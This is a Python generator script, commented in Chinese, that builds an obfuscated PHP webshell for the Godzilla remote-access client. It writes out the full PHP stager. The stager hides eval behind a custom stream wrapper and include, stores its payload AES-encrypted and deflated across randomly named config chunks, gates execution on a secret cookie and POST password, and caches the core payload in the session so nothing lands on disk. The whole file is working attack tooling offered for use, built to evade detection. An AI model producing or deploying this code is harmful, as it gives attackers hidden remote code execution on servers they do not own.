#!/usr/bin/env python3
"""
取消打断，隐藏了eval选择用自定义注册函数包含，自定义Stream Wrapper。
数组回调函数进行间接方法调用隐藏入口
"""

import argparse
import hashlib
import random
import sys
import zlib
from pathlib import Path
from typing import List, Tuple

try:
    from Crypto.Cipher import AES
except ImportError:
    print("Error: pycryptodome is required. Install with: pip install pycryptodome")
    sys.exit(1)


def random_identifier(rng: random.Random, prefix: str) -> str:
    suffix = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6))
    return f"{prefix}_{suffix}"


def random_hex_key(rng: random.Random, length: int = 6) -> str:
    return "".join(rng.choices("0123456789abcdef", k=length))


def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    padding_len = block_size - (len(data) % block_size)
    return data + bytes([padding_len] * padding_len)


def gzdeflate(data: bytes) -> bytes:
    """gzdeflate()：原始DEFLATE压缩"""
    compressor = zlib.compressobj(9, zlib.DEFLATED, -15)
    return compressor.compress(data) + compressor.flush()


def aes_ecb_encrypt(plaintext: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pkcs7_pad(plaintext))


def encode_stager(stager_code: str, aes_key: str) -> str:
    raw = stager_code.encode("utf-8")
    deflated = gzdeflate(raw)
    encrypted = aes_ecb_encrypt(deflated, aes_key.encode("utf-8"))
    return encrypted.hex()


def split_to_config(hex_data: str, rng: random.Random) -> List[Tuple[str, str]]:
    """随机hex键名。"""
    num_chunks = rng.randint(4, 6)
    chunk_size = len(hex_data) // num_chunks
    pairs = []
    for i in range(num_chunks):
        start = i * chunk_size
        end = start + chunk_size if i < num_chunks - 1 else len(hex_data)
        key = random_hex_key(rng)
        pairs.append((key, hex_data[start:end]))
    return pairs


def build_godzilla_compatible_stager(password: str, secret_key: str) -> Tuple[str, str]:
    # 必须匹配 ShellEntity.getSecretKeyX() 的逻辑: md5(secretKey).substring(0,16)
    key_x = hashlib.md5(secret_key.encode("utf-8")).hexdigest()[:16]

    # 推导确定性的 session ID，避免运行时多次 md5 计算和 session cookie 丢失
    sess_id = hashlib.md5((password + key_x).encode("utf-8")).hexdigest()

    stager_payload = f"""@session_id('{sess_id}');
@session_start();
@set_time_limit(0);
if (!function_exists('aesEnc')) {{
    function aesEnc($data,$key){{
        return openssl_encrypt($data,'AES-128-ECB',$key,OPENSSL_RAW_DATA);
    }}
}}
if (!function_exists('aesDec')) {{
    function aesDec($data,$key){{
        return openssl_decrypt($data,'AES-128-ECB',$key,OPENSSL_RAW_DATA);
    }}
}}

$pass='{password}';
$key='{key_x}';
$sid=md5($pass.$key);

if(isset($_POST[$pass])){{
    $data = aesDec(base64_decode($_POST[$pass]),$key);
    if ($data === false) {{ $data = ''; }}
    if (isset($_SESSION[$sid])){{
        $payload = aesDec($_SESSION[$sid],$key);
        if ($payload !== false){{
            if (strpos($payload,'getBasicsInfo')===false){{
                $payload = aesDec($payload,$key);
            }}
            @eval($payload);
            ob_start();
            $result = @run($data);
            $out = ob_get_clean();
            if ($result === null) {{
                $result = $out;
            }} else {{
                $result = $result . $out;
            }}
            if ($result === null) {{ $result = ''; }}
            echo substr($sid,0,16);
            echo base64_encode(aesEnc($result,$key));
            echo substr($sid,16);
        }}
    }} else {{
        if (strpos($data,'getBasicsInfo')!==false){{
            $_SESSION[$sid] = aesEnc($data,$key);
            @session_write_close();
            echo chr(32);
        }}
    }}
}}
"""
    return stager_payload, key_x


def build_webshell(
    password: str,
    secret_key: str,
    out_file: Path,
    cookie_name: str,
    cookie_key: str,
) -> str:
    rng = random.Random()

    stager_payload, key_x = build_godzilla_compatible_stager(password, secret_key)
    hex_data = encode_stager(stager_payload, cookie_key)
    config_pairs = split_to_config(hex_data, rng)

    class_name = random_identifier(rng, "StitchClass")
    wrapper_class = random_identifier(rng, "CacheStream")
    scheme = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz", k=8))
    global_key = random_identifier(rng, "buf")
    var_cfg = random_identifier(rng, "cfg")

    # 构建 PHP 配置数组条目
    cfg_entries = ",\n".join(f"        '{k}' => '{v}'" for k, v in config_pairs)

    php_code = f"""<?php

class {wrapper_class} {{
    private $d; private $p = 0; public $context;
    function stream_open($u, $m, $o, &$op) {{
        $this->d = $GLOBALS[parse_url($u, PHP_URL_HOST)];
        return true;
    }}
    function stream_read($c) {{
        $r = substr($this->d, $this->p, $c);
        $this->p += strlen($r);
        return $r;
    }}
    function stream_eof() {{ return $this->p >= strlen($this->d); }}
    function stream_stat() {{ return []; }}
}}

class {class_name} {{
    private ${var_cfg} = [
        {cfg_entries}
    ];

    public function __construct($pC) {{
        $h = implode('', $this->{var_cfg});
        $s = @gzinflate(@openssl_decrypt(hex2bin($h), 'AES-128-ECB', $pC, OPENSSL_RAW_DATA));

        $pk = '{password}';
        if ($s !== false && filter_input(INPUT_POST, $pk) !== null) {{
            unset($h);
            if (!in_array('{scheme}', stream_get_wrappers())) {{
                stream_wrapper_register('{scheme}', '{wrapper_class}');
            }}
            $GLOBALS['{global_key}'] = '<?php ' . $s;
            @include('{scheme}://{global_key}');
            unset($GLOBALS['{global_key}'], $s);
        }}
    }}
}}

$ck = '{cookie_name}';
$pk = '{password}';
$cv = filter_input(INPUT_COOKIE, $ck);
$pv = filter_input(INPUT_POST, $pk);
if ($cv !== null && $pv !== null) {{
    $cn = '{class_name}';
    $obj = new $cn($cv);
}}
echo ' ';
?>
"""

    with out_file.open("w", encoding="utf-8") as f:
        f.write(php_code)

    return key_x


def main() -> None:
    parser = argparse.ArgumentParser(
        description="""生成哥斯拉WebShell。
：
- 生成PHPwebshell,使用自定义stream wrapper+include
- AES-128-ECB
- gzdeflate+hex配置数组替代Base64类属性
- filter_input()替代 $_POST/$_COOKIE 直接引用
- 使用$_SESSION缓存哥斯拉核心 Payload无文件落地
"""
    )
    parser.add_argument("--output", default="session_stitch_shell.php", help="输出文件路径。")
    parser.add_argument(
        "--password",
        default="pass_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)),
        help="pass",
    )
    parser.add_argument(
        "--key",
        default="".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
        help="哥斯拉SecretKey(非 keyX)。",
    )
    args = parser.parse_args()

    out_path = Path(args.output).resolve()

    rng = random.Random()
    cookie_key = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
    cookie_name = "auth_" + "".join(rng.choices("abcdefghijklmnopqrstuvwxyz", k=3))

    key_x = build_webshell(
        args.password,
        args.key,
        out_path,
        cookie_name,
        cookie_key,
    )

    print("=" * 60)
    print("生成成功")
    print(f"输出文件路径  : {out_path}")
    print("= Godzilla Connection Settings =")
    print(f"Password  : {args.password}")
    print(f"SecretKey : {args.key}")
    print(f"keyX : {key_x}")
    print("Payload: PhpDynamicPayload")
    print("Cryption: PHP_CUSTOM_AES_BASE64")
    print("= 必须配置的请求头 =")
    print(f"Cookie: {cookie_name}={cookie_key};")
    print("=" * 60)


if __name__ == "__main__":
    main()
